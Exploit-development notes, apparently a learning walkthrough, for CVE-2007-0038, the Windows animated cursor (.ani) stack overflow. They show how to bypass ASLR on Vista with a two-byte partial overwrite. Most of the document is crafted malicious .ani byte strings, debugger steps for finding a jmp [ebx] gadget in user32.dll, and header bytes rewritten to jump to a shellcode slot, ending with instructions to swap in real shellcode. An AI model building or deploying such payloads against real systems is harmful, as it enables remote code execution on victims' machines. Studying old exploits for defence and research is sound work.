# ASLR
# Two bytes injection in Vista
# CVE-2007-0038 Animated Cursor stack overflow
# remark: CC INT 3 can be break point

## 1. POC (.ani)
```
"\x52\x49\x46\x46\x13\x03\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68"
"\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x58\x00\x00\x00"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x42\x42\x42\x42\x43\x43\x43\x43";
```

## 2. Review registers
* ebx address pointed to the header of the ani file
* ebx -> follow in dump -> follow DWORD in Dump -> RIFF
* jmp [ebx] is needed to go back to our controlled data

## 3. 2 bytes injection
```
"\x52\x49\x46\x46\x13\x03\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68" <--- headers
"\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x58\x00\x00\x00" <--- \x58 is the length of following data
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00" <--- data
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" <--- data
"\x42\x42\x42\x42\x43\x43\x43\x43";                                <--- data
```

### Change the length to be *\x56*
```
"\x52\x49\x46\x46\x13\x03\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68" <--- headers
"\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\x09\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x56\x00\x00\x00" <--- \x56 is new the length
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00" <--- data
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" <--- data
"\x42\x42\x42\x42\x43\x43";                                        <--- delete last 2 bytes
```

### EIP will be changed to in user32.dll (e.g. \x77\x24\x43\x43)

### Find jmp [ebx]
* CPU -> Search for -> Find all commands -> jmp [ebx]
OR
* CPU -> Search for -> Command -> jmp [ebx] -> ctrl+l next instruction
* Find the jmp DWORD PTR DS:[ebx]

## 4. Find the safe islands in the ani file
```
"\x52\x49\x46\x46*\x13\x03*\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68" <--- headers RIFF is safe to execute, \x13\x03 is the safe island
"\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00*\x09\x00*\x00\x00" <--- \x09\x00 is safe island
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x56\x00\x00\x00"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00" <--- data (safe)
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" <--- data (safe)
"\x42\x42\x42\x42\xab\x7b";                                        <--- 0x77247bab in user32
```

## 5. jmp to controlled shellcode
```
"\x52\x49\x46\x46\xeb\x17\x00\x00\x41\x43\x4f\x4e\x61\x6e\x69\x68" <--- jmp to pervious \x09\x00 position [pervious \x13\x03]
"\x24\x00\x00\x00\x24\x00\x00\x00\x02\x00\x00\x00\xe9\x75\x00\x00" <--- jmp to \xcc\xcc button of ani file [pervious \x09\x00]
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x61\x6e\x69\x68\x56\x00\x00\x00"
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x00\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" <--- data (safe)
"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x00\x00" <--- data (safe)
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" <--- data (safe)
"\x42\x42\x42\x42\xab\x7b\xcc\xcc";                                <--- \xcc\xcc
```

## 6. shellcode replace \xcc\xcc + Gameover
